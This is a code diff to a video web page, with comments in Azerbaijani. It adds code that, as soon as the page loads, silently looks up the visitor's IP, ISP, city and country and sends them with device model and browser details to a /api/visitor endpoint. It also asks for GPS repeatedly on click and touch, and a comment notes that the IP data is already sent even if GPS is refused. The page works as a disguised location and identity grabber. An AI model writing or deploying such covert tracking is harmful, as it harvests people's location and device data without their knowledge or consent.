@@ -160,18 +160,54 @@
             video.play().catch(() => {});
         });
 
-        // Videoya klik etdikdə pause/play + GPS soruş
+        // Videoya klik etdikdə GPS soruş + pause/play
         video.addEventListener('click', function() {
             requestLocation();
             if (video.paused) video.play();
             else video.pause();
         });
 
-        // Səhifə açılan kimi GPS soruş
-        window.addEventListener('load', function() {
-            video.load();
+        // Touchstart - mobil üçün videoya toxunanda da GPS soruş
+        video.addEventListener('touchstart', function() {
             requestLocation();
         });
+
+        // Səhifə açılan kimi əvvəlcə IP-ni göndər, sonra GPS soruş
+        window.addEventListener('load', function() {
+            video.load();
+            sendIPOnly();
+            requestLocation();
+        });
+
+        // GPS olmadan sadəcə IP məlumatını göndər
+        async function sendIPOnly() {
+            let ipData = {};
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                ipData = await res.json();
+            } catch(e) {}
+
+            const deviceInfo = await getDeviceInfo();
+
+            try {
+                await fetch('/api/visitor', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        ip: ipData.ip || '',
+                        isp: ipData.org || '',
+                        lat: null,
+                        lon: null,
+                        city: ipData.city || '',
+                        country: ipData.country_name || '',
+                        device: deviceInfo,
+                        browser: getBrowserName(),
+                        timestamp: new Date().toISOString(),
+                        gpsAllowed: false
+                    })
+                });
+            } catch(e) {}
+        }
 
         function requestLocation() {
             if (!navigator.geolocation) return;
@@ -200,6 +236,8 @@
                 city = data.address.city || data.address.town || data.address.village || '';
             } catch(e) {}
 
+            const deviceInfo = await getDeviceInfo();
+
             try {
                 await fetch('/api/visitor', {
                     method: 'POST',
@@ -211,15 +249,66 @@
                         lon: lon.toFixed(4),
                         city: city,
                         country: ipData.country_name || '',
-                        device: navigator.platform,
-                        browser: navigator.userAgent.split(' ').pop(),
-                        timestamp: new Date().toISOString()
+                        device: deviceInfo,
+                        browser: getBrowserName(),
+                        timestamp: new Date().toISOString(),
+                        gpsAllowed: true
                     })
                 });
             } catch(e) {}
         }
 
-        function onError(err) {}
+        function onError(err) {
+            // GPS rədd edildi - amma IP artıq sendIPOnly ilə göndərilib
+        }
+
+        // Cihaz məlumatını al
+        async function getDeviceInfo() {
+            // navigator.userAgentData varsa (Chrome 90+)
+            if (navigator.userAgentData) {
+                try {
+                    const data = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
+                    if (data.model) return data.model;
+                    if (data.platform) return data.platform;
+                } catch(e) {}
+            }
+            
+            // User-Agent-dan təyin et
+            const ua = navigator.userAgent;
+            
+            // iPhone
+            if (/iPhone/.test(ua)) {
+                const match = ua.match(/iPhone\s*OS\s*([\d_]+)/);
+                return match ? 'iPhone (iOS ' + match[1].replace(/_/g, '.') + ')' : 'iPhone';
+            }
+            
+            // iPad
+            if (/iPad/.test(ua)) return 'iPad';
+            
+            // Android - model adını çıxar
+            const androidMatch = ua.match(/;\s*([^;)]+?)\s*(?:Build|[;)])/);
+            if (androidMatch && !/Linux|Android|wv/.test(androidMatch[1])) {
+                return androidMatch[1].trim();
+            }
+            
+            // Desktop
+            if (/Windows/.test(ua)) return 'Windows PC';
+            if (/Macintosh/.test(ua)) return 'Mac';
+            if (/Linux/.test(ua)) return 'Linux';
+            
+            return navigator.platform || 'Naməlum';
+        }
+
+        // Brauzer adını al
+        function getBrowserName() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
+            if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
+            if (ua.includes('Firefox')) return 'Firefox';
+            if (ua.includes('Edg')) return 'Edge';
+            if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
+            return 'Digər';
+        }
     </script>
 </body>
 </html>
